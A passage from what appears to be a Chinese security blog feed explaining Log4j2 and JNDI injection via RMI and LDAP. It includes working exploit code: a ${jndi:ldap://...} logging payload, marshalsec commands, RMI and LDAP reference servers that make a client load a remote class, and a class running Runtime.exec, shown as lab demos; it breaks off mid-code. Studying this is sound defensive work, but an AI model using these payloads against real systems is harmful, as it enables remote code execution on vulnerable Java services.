plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.6.110/#Calc&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325175647330.png" alt="image-20240325175647330"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>Log4j2.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://192.168.6.110:9999/Calc&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>marshalsec项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.6.110/#Calc&quot; 9999</span><br></pre></td></tr></table></figure><p>具体参考fastjson1.2.24</p>]]></content>
      
      
      <categories>
          
          <category> Vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI</title>
      <link href="/2024/03/27/java/JNDI/"/>
      <url>/2024/03/27/java/JNDI/</url>
      
        <content type="html"><![CDATA[<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240320194727812.png" alt="image-20240320194727812"></p><h4 id="命名服务（Naming-Server）"><a href="#命名服务（Naming-Server）" class="headerlink" title="命名服务（Naming Server）"></a>命名服务（Naming Server）</h4><p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p><p>在命名服务中，有几个重要的概念。</p><ul><li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li><li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li><li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul><h4 id="目录服务（Directory-Service）"><a href="#目录服务（Directory-Service）" class="headerlink" title="目录服务（Directory Service）"></a>目录服务（Directory Service）</h4><p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p><p>一些常见的目录服务有：</p><ul><li>LDAP： 轻型目录访问协议</li><li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li><li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li></ul><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><code>lookup()</code>函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240320195215502.png" alt="image-20240320195215502"></p><h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h4><p>通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定从远程加载构造的恶意<code>Factory</code>类，客户端在进行<code>lookup</code>的时候，会从远程动态加载攻击者构造的恶意<code>Factory</code>类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。</p><p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code>，</p><ol><li><code>className</code> - 远程加载时所使用的类名</li><li><code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</li><li><code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li></ol><p>因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类，故不能作为远程对象bind到注册中心，所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p><p>test.java</p><p>恶意代码（test.class），将其编译好放到可访问的<code>http</code>服务下<code>(python -m http.server)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不能放在任何包下</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>, wrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JndiClient.java</p><p>客户端通过<code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/calc&quot;)</code>获取远程对象时，会执行我们的恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322210853305.png" alt="image-20240322210853305"></p><h4 id="JNDI原理探索"><a href="#JNDI原理探索" class="headerlink" title="JNDI原理探索"></a>JNDI原理探索</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324133202682.png" alt="image-20240324133202682"></p><p>跟进<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>，</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324135842476.png" alt="image-20240324135842476"></p><p>这里将从服务端返回的<code>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub#getReference</code>返回<code>Reference</code>对象</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324135551407.png" alt="image-20240324135551407"></p><p>跟进<code>javax.naming.spi.NamingManager#getObjectInstance</code>，此处为获取<code>Factory</code>类的实例</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324140614944.png" alt="image-20240324140614944"></p><p>跟进<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>，此处<code>clas = helper.loadClass(factoryName);</code>尝试从本地加载<code>Factory</code>类</p><p>如果不存在本地不存在此类，则会从<code>codebase</code>中加载：<code>clas = helper.loadClass(factoryName, codebase);</code>会从远程加载我们恶意class，然后在<code>return</code>那里<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>对我们的恶意类进行一个实例化，进而加载我们的恶意代码。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324141804449.png" alt="image-20240324141804449"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><h4 id="LDAP简介"><a href="#LDAP简介" class="headerlink" title="LDAP简介"></a>LDAP简介</h4><p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP&#x2F;IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p><p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p><p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下：</p><ul><li>dn ：一条记录的详细位置</li><li>dc ：一条记录所属区域    (哪一颗树)</li><li>ou ：一条记录所属组织    （哪一个分支）</li><li>cn&#x2F;uid：一条记录的名字&#x2F;ID   (哪一个苹果名字)</li><li>…</li></ul><p>LDAP目录树的最顶部就是根，也就是所谓的“基准DN”</p><p>我们也可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。LDAP能够存储的Java对象如下：</p><ul><li>Java 序列化</li><li>JNDI的References</li><li>Marshalled对象</li><li>Remote Location</li></ul><p><strong>Ldap依赖：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>LDAP服务，代码改自<code>marshalsec</code></p><p><code>JDK 6u132</code>, <code>JDK 7u122</code>, <code>JDK 8u113</code>中Java限制了通过<code>RMI</code>远程加载<code>Reference</code>工厂类，<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为了<code>false</code>，即默认不允许通过RMI从远程的<code>Codebase</code>加载<code>Reference</code>工厂类</p><p>JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载<code>Factory</code>类进行了限制，在<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的值默认为<code>false</code></p><h4 id="Jdk-8u191"><a href="#Jdk-8u191" class="headerlink" title="Jdk &lt; 8u191"></a>Jdk &lt; 8u191</h4><p>恶意代码（test.class），将其编译好放到可访问的<code>http</code>服务下<code>(python -m http.server)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不能放在任何包下</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LDAPRefServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPRefServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JNDI_Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322212803353.png" alt="image-20240322212803353"></p><h4 id="Jdk-8u191-1"><a href="#Jdk-8u191-1" class="headerlink" title="Jdk &gt;&#x3D; 8u191"></a>Jdk &gt;&#x3D; 8u191</h4><p><strong>通过反序列</strong></p><p>通过反序列，那么前提是客户端得有可用的<code>Gadgets</code></p><p>LDAPServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span 